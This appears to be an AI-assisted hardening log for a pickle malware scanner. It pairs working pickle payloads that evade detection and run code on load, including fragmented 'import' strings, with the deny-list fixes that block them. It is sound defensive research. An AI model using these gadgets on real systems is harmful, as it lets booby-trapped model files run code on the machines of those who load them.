- Scanner import references: `pathlib.PosixPath`, `builtins.str.join`,
  `pathlib.Path.write_text`, and `site.addsitedir`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final `site.addsitedir("/tmp")`
  call writes `/tmp/ma_site_addsitedir_exec.pth` but does not create
  `/tmp/ma_site_addsitedir_marker`
- Unpickle result: the full payload writes the `.pth` file, calls
  `site.addsitedir("/tmp")`, creates `/tmp/ma_site_addsitedir_marker`, and
  returns `None`
- RCE mechanism: the pickle writes a `.pth` file containing
  `import pathlib; pathlib.Path('/tmp/ma_site_addsitedir_marker').touch()`.
  `site.addsitedir()` processes `.pth` files in that directory and executes
  lines beginning with `import`, so attacker-controlled Python code runs during
  deserialization.

Why the scanner missed it:

- `site.addsitedir` is absent from `DANGEROUS_GLOBALS`; only `site.main` is
  currently listed.
- The payload uses only currently clean globals: `pathlib.PosixPath`,
  `builtins.str.join`, `pathlib.Path.write_text`, and `site.addsitedir`.
- The required `.pth` executable line is assembled from `"im"` and
  `"port pathlib; ..."` fragments at unpickle time. No single pickle string
  literal contains an `import` statement, so the suspicious-string heuristic
  does not fire.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is a file-mediated Python execution sink. The focused
next block should add sorted `DANGEROUS_GLOBALS` entries for
`("site", "addsitedir")` and the lower-level `.pth` processor
`("site", "addpackage")`, plus a manual-pickle oracle regression for the
fragmented-import `.pth` proof. The hot path remains static policy lookup.

## Turn 48 - Block `site.addsitedir` `.pth` execution

Blocking plan:

- Add `("site", "addsitedir")` and `("site", "addpackage")` to the sorted
  Rust `DANGEROUS_GLOBALS` table. `addsitedir` is the public site-directory
  processor and `addpackage` is the lower-level `.pth` processor that executes
  import-prefixed lines.
- Add portable policy coverage for raw reductions of both site functions so
  detection does not depend on the fragmented `.pth` oracle shape.
- Add a CPython oracle regression that first proves the fragmented
  `Path.write_text()` payload only writes the `.pth` file, then proves adding
  `site.addsitedir(tmp_path)` executes that `.pth` file and creates the marker
  during `pickle.loads()`.

Performance note: the fix adds two tuples to a sorted static table checked
with binary search. It does not add filesystem simulation, `.pth` parsing, or
cross-literal string reconstruction for fragmented import statements.

## Turn 49 - `unittest.loader.TestLoader.discover` import-execution gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using stdlib test discovery to
import attacker-written Python code.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_unittest_discover_marker")
module_path = Path("/tmp/ma_unittest_discover_exec.py")
content_parts = [
    "im",
    "port pathlib; pathlib.Path(",
    repr(str(marker)),
    ").touch()\n",
]
payload = b"".join(
    [
        b"\x80\x04",
        sg("pathlib", "PosixPath"),
        b"(",
        s("/"),
        s("tmp"),
        s("ma_unittest_discover_exec.py"),
        b"tR\x940",
        sg("builtins", "str.join"),
        b"(",
        s(""),
        b"(",
        *(s(part) for part in content_parts),
        b"ttR\x940",
        sg("pathlib", "Path.write_text"),
        b"(h\x00h\x01tR0",
        sg("unittest.loader", "TestLoader"),
        b")R\x940",
        sg("unittest.loader", "TestLoader.discover"),
        b"(",
        b"h\x02",
        s("/tmp"),
        s(module_path.name),
        b"tR.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=327`, `bytes_total=327`, `opcode_count=53`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `pathlib.PosixPath`, `builtins.str.join`,
  `pathlib.Path.write_text`, `unittest.loader.TestLoader`, and
  `unittest.loader.TestLoader.discover`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `TestLoader.discover()`
  call writes `/tmp/ma_unittest_discover_exec.py` but does not create
  `/tmp/ma_unittest_discover_marker`
- Unpickle result: the full payload writes the module, runs
  `TestLoader.discover("/tmp", "ma_unittest_discover_exec.py")`, creates
  `/tmp/ma_unittest_discover_marker`, and returns a `unittest.suite.TestSuite`
- RCE mechanism: `discover()` temporarily makes the start directory importable
  and imports matching Python files. The attacker-written module contains
  top-level code, so importing it executes attacker-controlled Python during
  deserialization.

Why the scanner missed it:

- `unittest.loader` is absent from both `DANGEROUS_WILDCARD_MODULES` and
  `DANGEROUS_GLOBALS`.
- The payload uses only currently clean globals: `pathlib.PosixPath`,
  `builtins.str.join`, `pathlib.Path.write_text`,
  `unittest.loader.TestLoader`, and
  `unittest.loader.TestLoader.discover`.
- The imported module's executable line is assembled from `"im"` and
  `"port pathlib; ..."` fragments at unpickle time. No single pickle string
  literal contains an `import` statement, so the suspicious-string heuristic
  does not fire.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another file-mediated Python execution sink, this
time through test discovery/import behavior rather than site `.pth` handling.
The focused next block should add sorted `DANGEROUS_GLOBALS` entries for
`("unittest.loader", "TestLoader.discover")`,
`("unittest.loader", "TestLoader.loadTestsFromName")`, and
`("unittest.loader", "TestLoader.loadTestsFromNames")`, plus a manual-pickle
oracle regression for the fragmented-import discovery proof. The hot path
remains static policy lookup.

## Turn 50 - Block `unittest` loader import execution

Blocking plan:

- Add sorted `DANGEROUS_GLOBALS` entries for
  `unittest.loader.TestLoader.discover`,
  `unittest.loader.TestLoader.loadTestsFromName`, and
  `unittest.loader.TestLoader.loadTestsFromNames`. These APIs import
  attacker-selected modules or files and therefore execute top-level Python
  during unpickling.
- Add the equivalent public alias entries exposed through `unittest` and
  `unittest.loader.defaultTestLoader`, so the same import-execution sink cannot
  be reached by changing only the dotted global path.
- Add portable policy coverage for the raw reductions so detection does not
  depend on running discovery.
- Add a CPython oracle regression that first proves the fragmented
  `Path.write_text()` payload only writes the module file, then proves adding
  `TestLoader.discover(tmp_path, pattern)` imports that module and creates the
  marker during `pickle.loads()`.

Performance note: the fix adds static policy entries checked by binary search.
It does not add filesystem simulation, import graph modeling, or cross-literal
string reconstruction for fragmented import statements.

## Turn 51 - `unittest.mock.patch` start-time import gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using `unittest.mock.patch()`
to import an attacker-written module when the patcher starts.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_unittest_mock_patch_marker")
module_path = Path.cwd() / "ma_unittest_mock_patch_exec.py"
module_name = module_path.stem
content_parts = [
    "im",
    "port pathlib; pathlib.Path(",
    repr(str(marker)),
    ").touch()\nsomeattr = 1\n",
]
payload = b"".join(
    [
        b"\x80\x04",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in module_path.parts),
        b"tR\x940",
        sg("builtins", "str.join"),
        b"(",
        s(""),
        b"(",
        *(s(part) for part in content_parts),
        b"ttR\x940",
        sg("pathlib", "Path.write_text"),
        b"(h\x00h\x01tR0",
        sg("unittest.mock", "patch"),
        b"(",
        s(f"{module_name}.someattr"),
        b"K\x02tR\x940",
        sg("unittest.mock", "_patch.start"),
        b"h\x02\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=381`, `bytes_total=381`, `opcode_count=58`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `pathlib.PosixPath`, `builtins.str.join`,
  `pathlib.Path.write_text`, `unittest.mock.patch`, and
  `unittest.mock._patch.start`, all with `is_dangerous=False`
- Control proof: the same pickle without the final
  `unittest.mock._patch.start(patcher)` call writes
  `ma_unittest_mock_patch_exec.py` into the current importable working
  directory but does not create `/tmp/ma_unittest_mock_patch_marker`
- Unpickle result: the full payload writes the module, constructs
  `patch("ma_unittest_mock_patch_exec.someattr", 2)`, starts the patcher,
  creates `/tmp/ma_unittest_mock_patch_marker`, and returns `2`
- RCE mechanism: `patch()` stores a dotted target string without importing it.
  `_patch.start()` enters the patcher, imports the target module to resolve the
  attribute, and therefore executes attacker-controlled top-level Python during
  deserialization.

Why the scanner missed it:

- The prior `unittest.mock` block covered `Mock` and `MagicMock` callable
  proxies only; `unittest.mock.patch` and `unittest.mock._patch.start` are
  absent from `DANGEROUS_GLOBALS`.
- `unittest.mock` is still absent from `DANGEROUS_WILDCARD_MODULES`.
- The payload uses only currently clean globals: `pathlib.PosixPath`,
  `builtins.str.join`, `pathlib.Path.write_text`, `unittest.mock.patch`, and
  `unittest.mock._patch.start`.
- The imported module's executable line is assembled from `"im"` and
  `"port pathlib; ..."` fragments at unpickle time. No single pickle string
  literal contains an `import` statement, so the suspicious-string heuristic
  does not fire.
- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
  `os.system`, or `subprocess`.

Performance note: this is another file-mediated import-execution sink, this
time through mock patch target resolution rather than test discovery. The
focused next block should add sorted `DANGEROUS_GLOBALS` entries for
`("unittest.mock", "patch")`, `("unittest.mock", "patch.dict")`,
`("unittest.mock", "patch.multiple")`, and
`("unittest.mock", "_patch.start")`, plus a manual-pickle oracle regression
for the start-time import proof. The hot path remains static policy lookup.

## Turn 52 - Block `unittest.mock.patch` target imports

Blocking plan:

- Add sorted `DANGEROUS_GLOBALS` entries for `unittest.mock.patch`,
  `unittest.mock.patch.dict`, and `unittest.mock.patch.multiple`. These
  constructors can carry attacker-selected dotted targets that are imported
  when the patcher is entered.
- Add `unittest.mock._patch.start` and `unittest.mock._patch.__enter__` because
  those are the patcher entry points that resolve/import the target.
- Add portable policy coverage for raw reductions of all five symbols so
  detection does not depend on a particular importable module layout.
- Add a CPython oracle regression that first proves the fragmented
  `Path.write_text()` payload only writes the module file, then makes the
  `tmp_path` importable and proves adding `_patch.start(patcher)` imports that
  module and creates the marker during `pickle.loads()`.

Performance note: the fix adds static policy entries checked by binary search.
It does not add import graph modeling, patcher state tracking, or cross-literal
string reconstruction for fragmented import statements.

## Turn 53 - `types.MethodType` bound-method invocation gap

Goal: produce another aggressive RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using `types.MethodType()` to
turn a clean-looking unbound method plus attacker-controlled state into a
zero-argument callable that a later `REDUCE` can execute.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_types_methodtype_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR\x940",
        sg("types", "MethodType"),
        b"(",
        sg("pathlib", "Path.touch"),
        b"h\x00",
        b"tR",
        b")R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=114`, `bytes_total=114`, `opcode_count=25`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `pathlib.PosixPath`, `types.MethodType`, and
  `pathlib.Path.touch`, all with `is_dangerous=False`
- Control proof: the same pickle without the final empty-argument `REDUCE`
  returns `<bound method Path.touch of PosixPath(...)>` and does not create
  `/tmp/ma_types_methodtype_marker`
- Unpickle result: the full payload constructs
  `types.MethodType(pathlib.Path.touch, marker)`, invokes the resulting bound
  method with an empty argument tuple, creates
  `/tmp/ma_types_methodtype_marker`, and returns `None`
- RCE mechanism: `MethodType()` lets the payload pre-bind attacker-controlled
  receiver state to an otherwise clean unbound method. The scanner sees only
  static globals, while the second `REDUCE` executes the newly synthesized
  bound method from the pickle stack.

Why the scanner missed it:

- `types` is not wildcard-dangerous; only `types.CodeType` and
  `types.FunctionType` are currently blocked.
- `types.MethodType` is absent from `DANGEROUS_GLOBALS`.
- The final execution step uses a dynamic callable already on the pickle stack,
  so there is no second import reference such as `pathlib.Path.touch()` for the
  policy table to classify.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a generic arity-shifting invocation primitive rather
than a string or import heuristic gap. The focused next block should add a
sorted `DANGEROUS_GLOBALS` entry for `("types", "MethodType")`, with a
manual-pickle oracle regression proving scan-time detection before the
bound-method marker is created. The hot path remains a static binary-search
policy lookup.

## Turn 54 - Block `types.MethodType` bound-method synthesis

Blocking plan:

- Add `("types", "MethodType")` to the sorted dangerous-global table. The API
  can bind attacker-controlled receiver state to a callable and synthesize a new
  callable that later `REDUCE` opcodes invoke from the pickle stack.
- Add portable Rust policy coverage for raw `types.MethodType` reductions so
  detection does not depend on executing the runtime gadget.
- Add a CPython oracle regression that first proves
  `MethodType(Path.touch, marker)` only creates a bound method, then proves a
  follow-on empty-argument `REDUCE` creates the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the block is a single static policy-table entry checked by
binary search. It does not add callable graph analysis, stack-shape simulation,
or cross-opcode execution modeling for synthesized callables.

## Turn 55 - `builtins.staticmethod` callable descriptor gap

Goal: produce another compact RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using `staticmethod()` as a
callable wrapper around an attacker-selected function.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_builtins_staticmethod_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "staticmethod"),
        sg("pathlib", "Path.touch"),
        b"\x85R\x940",
        b"h\x00",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=123`, `bytes_total=123`, `opcode_count=24`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.staticmethod`, `pathlib.Path.touch`,
  and `pathlib.PosixPath`, all with `is_dangerous=False`
- Control proof: the same pickle without the final descriptor call returns
  `<staticmethod(<function Path.touch ...>)>` and does not create
  `/tmp/ma_builtins_staticmethod_marker`
- Unpickle result: the full payload constructs `staticmethod(Path.touch)`,
  retrieves that memoized descriptor object, invokes it with the attacker-chosen
  `Path`, creates `/tmp/ma_builtins_staticmethod_marker`, and returns `None`
- RCE mechanism: since Python 3.10, `staticmethod` objects are directly
  callable and proxy calls to their wrapped function. The pickle turns a
  clean-looking builtin descriptor constructor into a stack-resident callable
  that a later `REDUCE` executes.

Why the scanner missed it:

- `builtins.staticmethod` is absent from `BUILTIN_DANGEROUS_NAMES`.
- The scanner correctly sees `builtins.staticmethod`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`, but all three are currently classified as clean.
- The dangerous invocation uses the synthesized descriptor object from the
  pickle stack, so there is no later dangerous global for the static policy
  table to classify.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is another callable-wrapper primitive, but the focused
next block can stay cheap: add `staticmethod` to `BUILTIN_DANGEROUS_NAMES` and
add a manual-pickle oracle regression for the descriptor-call marker proof.
The hot path remains a membership check on the builtin policy table.

## Turn 56 - Block `builtins.staticmethod` callable descriptors

Blocking plan:

- Add `staticmethod` to `BUILTIN_DANGEROUS_NAMES`. On supported Python
  versions, `staticmethod` objects can be called directly and proxy execution
  to attacker-selected wrapped callables.
- Add portable Rust policy coverage for raw `builtins.staticmethod` reductions
  so the scanner flags the wrapper constructor without running the descriptor.
- Add a CPython oracle regression that first proves
  `staticmethod(Path.touch)` only creates a descriptor, then proves a follow-on
  descriptor call creates the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix is a single builtin-name membership entry. It avoids
descriptor-flow modeling, stack-object callability simulation, and broader
callable-wrapper analysis.

## Turn 57 - `_functools.partial` private-alias callable gap

Goal: produce another compact RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using CPython's private
`_functools.partial` alias to bypass the scanner's public `functools.partial`
warning policy.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_private_functools_partial_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("_functools", "partial"),
        sg("pathlib", "Path.touch"),
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x86R\x940",
        b"h\x00)R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=124`, `bytes_total=124`, `opcode_count=24`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `_functools.partial`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`, all with `is_dangerous=False`
- Control proof: the same pickle without the final empty-argument `REDUCE`
  returns `functools.partial(Path.touch, marker)` and does not create
  `/tmp/ma_private_functools_partial_marker`
- Unpickle result: the full payload constructs the partial, retrieves the
  memoized partial object, invokes it with an empty argument tuple, creates
  `/tmp/ma_private_functools_partial_marker`, and returns `None`
- RCE mechanism: `_functools.partial` and `functools.partial` are the same
  callable factory exposed through different module paths. The scanner warns on
  the public `functools.partial` path, but the private `_functools.partial`
  alias remains clean and can synthesize a stack-resident callable that a later
  `REDUCE` executes.

Why the scanner missed it:

- The warning policy only covers module `functools` names `partial` and
  `partialmethod`; it does not cover `_functools`.
- `_functools` is absent from `DANGEROUS_WILDCARD_MODULES`, and
  `_functools.partial` is absent from `DANGEROUS_GLOBALS`.
- The dangerous invocation uses the synthesized partial object from the pickle
  stack, so there is no later dangerous global for the static policy table to
  classify.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is another callable-wrapper alias gap. The focused next
block should add a sorted `DANGEROUS_GLOBALS` entry for
`("_functools", "partial")`, with a manual-pickle oracle regression proving
scan-time detection before the memoized partial creates the marker. The hot
path remains a static binary-search policy lookup.

## Turn 58 - Block `_functools.partial` private alias

Blocking plan:

- Add `("_functools", "partial")` to the sorted dangerous-global table. This
  private CPython alias reaches the same partial factory as `functools.partial`
  but had no warning or critical policy coverage.
- Add portable Rust policy coverage for raw `_functools.partial` reductions so
  detection does not depend on executing the synthesized partial.
- Add a CPython oracle regression that first proves
  `_functools.partial(Path.touch, marker)` only creates a partial object, then
  proves a follow-on empty-argument `REDUCE` creates the marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix is a single sorted policy-table entry checked by
binary search. It does not add alias resolution, callable-flow tracking, or
special-case analysis for partial object internals.

## Turn 59 - `_functools.reduce` private-alias reducer gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using CPython's private
`_functools.reduce` alias to bypass the scanner's public `functools.reduce`
critical policy.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_private_functools_reduce_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("_functools", "reduce"),
        sg("pathlib", "Path.touch"),
        b"]",
        b"M\xb6\x01",
        b"a",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x87R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=121`, `bytes_total=121`, `opcode_count=22`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `_functools.reduce`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`, all with `is_dangerous=False`
- Control proof: the same pickle without the final `REDUCE` returns
  `(Path.touch, [0o666], marker)` and does not create
  `/tmp/ma_private_functools_reduce_marker`
- Unpickle result: the full payload calls
  `_functools.reduce(Path.touch, [0o666], marker)`, creates
  `/tmp/ma_private_functools_reduce_marker`, and returns `None`
- RCE mechanism: `reduce(function, iterable, initializer)` calls the supplied
  function with the initializer and the first iterable item. The payload uses
  the marker path as the initializer and `0o666` as the first item, so
  `Path.touch(marker, 0o666)` executes during deserialization.

Why the scanner missed it:

- `functools.reduce` is listed as critical, but the private CPython
  `_functools.reduce` alias is absent from `DANGEROUS_GLOBALS`.
- `_functools` is absent from `DANGEROUS_WILDCARD_MODULES`.
- The payload uses only currently clean globals: `_functools.reduce`,
  `pathlib.Path.touch`, and `pathlib.PosixPath`.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a private-alias gap for an already-known reducer
sink. The focused next block should add a sorted `DANGEROUS_GLOBALS` entry for
`("_functools", "reduce")`, with a manual-pickle oracle regression proving
scan-time detection before the reducer creates the marker. The hot path remains
a static binary-search policy lookup.

## Turn 60 - Block `_functools.reduce` private alias

Blocking plan:

- Add `("_functools", "reduce")` to the sorted dangerous-global table. This
  private CPython alias reaches the same reducer sink as public
  `functools.reduce`, which is already considered critical.
- Add portable Rust policy coverage for raw `_functools.reduce` reductions so
  detection does not depend on executing the reducer.
- Add a CPython oracle regression that first proves the reducer arguments only
  form a tuple in the control pickle, then proves
  `_functools.reduce(Path.touch, [0o666], marker)` creates the marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix is a single sorted policy-table entry checked by
binary search. It does not add private-alias discovery, reducer-specific stack
simulation, or callable-flow tracking.

## Turn 61 - `functools.cache` callable-wrapper family gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using public `functools`
decorator factories that synthesize callable wrappers around an
attacker-selected function.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_functools_cache_wrapper_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("functools", "cache"),
        sg("pathlib", "Path.touch"),
        b"\x85R\x94",
        b"h\x00",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=118`, `bytes_total=118`, `opcode_count=23`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `functools.cache`, `pathlib.Path.touch`, and
  `pathlib.PosixPath`, all with `is_dangerous=False`
- Control proof: the same pickle without the final wrapper call returns
  `<functools._lru_cache_wrapper ...>` and does not create
  `/tmp/ma_functools_cache_wrapper_marker`
- Unpickle result: the full payload constructs
  `functools.cache(pathlib.Path.touch)`, retrieves the memoized wrapper,
  invokes it with the attacker-chosen `Path`, creates
  `/tmp/ma_functools_cache_wrapper_marker`, and returns `None`
- Sibling proof: the same wrapper-call shape also scanned clean and created
  markers for `functools.lru_cache` (`payload_len=126`) and
  `functools.singledispatch` (`payload_len=136`), both with
  `opcode_count=23`, `findings=[]`, and `notices=[]`
- RCE mechanism: these decorator factories accept an arbitrary callable and
  return a new callable wrapper. The pickle first synthesizes the wrapper from
  clean-looking globals, then a later `REDUCE` invokes that stack-resident
  wrapper with attacker-controlled arguments during deserialization.

Why the scanner missed it:

- `functools.cache`, `functools.lru_cache`, and `functools.singledispatch` are
  absent from `DANGEROUS_GLOBALS`.
- The `functools` warning policy only covers `partial` and `partialmethod`, so
  these decorator factories currently classify as clean rather than suspicious
  or malicious.
- The payload uses only currently clean globals:
  `functools.cache`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
- The dangerous invocation uses the synthesized wrapper object from the pickle
  stack, so there is no later dangerous global for the static policy table to
  classify.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a public callable-wrapper family rather than another
private alias gap. The focused next block should add sorted
`DANGEROUS_GLOBALS` entries for `("functools", "cache")`,
`("functools", "lru_cache")`, and `("functools", "singledispatch")`, plus a
manual-pickle oracle regression proving scan-time detection before the
memoized wrapper creates the marker. The hot path remains static binary-search
policy lookup.

## Turn 62 - Block public `functools` callable wrappers

Blocking plan:

- Add `("functools", "cache")`, `("functools", "lru_cache")`, and
  `("functools", "singledispatch")` to the sorted Rust `DANGEROUS_GLOBALS`
  table. These decorator factories all accept an attacker-selected callable and
  return a stack-resident wrapper that a later `REDUCE` can invoke with
  attacker-controlled arguments.
- Keep the existing `functools` warning policy scoped to `partial` and
  `partialmethod`; the three wrapper factories become critical direct-policy
  hits, while `functools.partial` remains a warning for compatibility.
- Add a parameterized CPython oracle regression that builds the exact
  memoized-wrapper pickle for each factory, verifies scan-time detection on
  both the control and RCE payloads, proves the control wrapper does not create
  the marker, then proves the full payload creates the marker during
  `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix adds three tuples to a sorted static table checked
with binary search. It does not add wrapper-object tracking, decorator
semantics, or callable-flow simulation.

## Turn 63 - `builtins.property.__get__` descriptor invocation gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using Python's property
descriptor protocol to call an attacker-selected getter during deserialization.

Payload shape:

```python
from pathlib import Path


def s(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return s(module) + s(name) + b"\x93"


marker = Path("/tmp/ma_builtins_property_get_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "property"),
        sg("pathlib", "Path.touch"),
        b"\x85R\x94",
        sg("builtins", "property.__get__"),
        b"h\x00",
        sg("pathlib", "PosixPath"),
        b"(",
        *(s(part) for part in marker.parts),
        b"tR",
        b"\x86R.",
    ]
)
```

Proof on CPython 3.12.12:

- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
  `findings=[]`, `notices=[]`
- Coverage: `bytes_scanned=147`, `bytes_total=147`, `opcode_count=26`,
  `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.property`, `pathlib.Path.touch`,
  `builtins.property.__get__`, and `pathlib.PosixPath`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the final descriptor-get call returns
  `<property object ...>` with `fget=pathlib.Path.touch` and does not create
  `/tmp/ma_builtins_property_get_marker`
- Unpickle result: the full payload creates
  `/tmp/ma_builtins_property_get_marker` and returns `None`
- RCE mechanism: `property.__get__(prop, obj)` invokes `prop.fget(obj)`.
  The payload first constructs `property(pathlib.Path.touch)`, then calls the
  unbound descriptor getter with the attacker-chosen `Path` as `obj`, causing
  `Path.touch(marker)` to execute before `pickle.loads()` returns.

Why the scanner missed it:

- `builtins.property` is absent from `BUILTIN_DANGEROUS_NAMES`.
- `builtins.property.__get__` is also absent from `BUILTIN_DANGEROUS_NAMES`,
  and builtin checks are exact-name checks even when the pickle `STACK_GLOBAL`
  name contains dots.
- The payload uses only currently clean globals:
  `builtins.property`, `pathlib.Path.touch`, `builtins.property.__get__`, and
  `pathlib.PosixPath`.
- The dangerous function is stored inside a synthesized descriptor object, then
  reached through a clean-looking descriptor method rather than through a
  directly policy-listed callable.
- The payload has no suspicious string seeds such as `eval(`, `exec(`,
  `__import__`, `os.system`, or `subprocess`.

Performance note: this is a descriptor-method sink with a precise static name.
The focused next block should add `property.__get__` to
`BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression proving
scan-time detection before the descriptor getter creates the marker. The hot
path remains the existing builtin exact-name membership check.

## Turn 64 - Block `builtins.property.__get__` descriptor calls

Blocking plan:

- Add `property.__get__` to `BUILTIN_DANGEROUS_NAMES`. The exact dotted builtin
  name reaches the descriptor method that invokes a property object's
  attacker-controlled `fget` callable.
- Leave `builtins.property` itself allowed because constructing a descriptor
  does not execute the getter. The sink is the descriptor-get method, not the
  descriptor constructor.
- Add a CPython oracle regression that builds the manual
  `property(Path.touch)` payload, verifies the control descriptor still scans
  clean and does not create the marker, then verifies scan-time detection on
  the RCE variant before proving `property.__get__(prop, marker)` creates the
  marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]` because this strengthens
  user-visible pickle detection coverage.

Performance note: the fix is a single exact builtin-name membership check. It
does not add descriptor-object tracking, dotted-name expansion, or stack-flow
simulation.

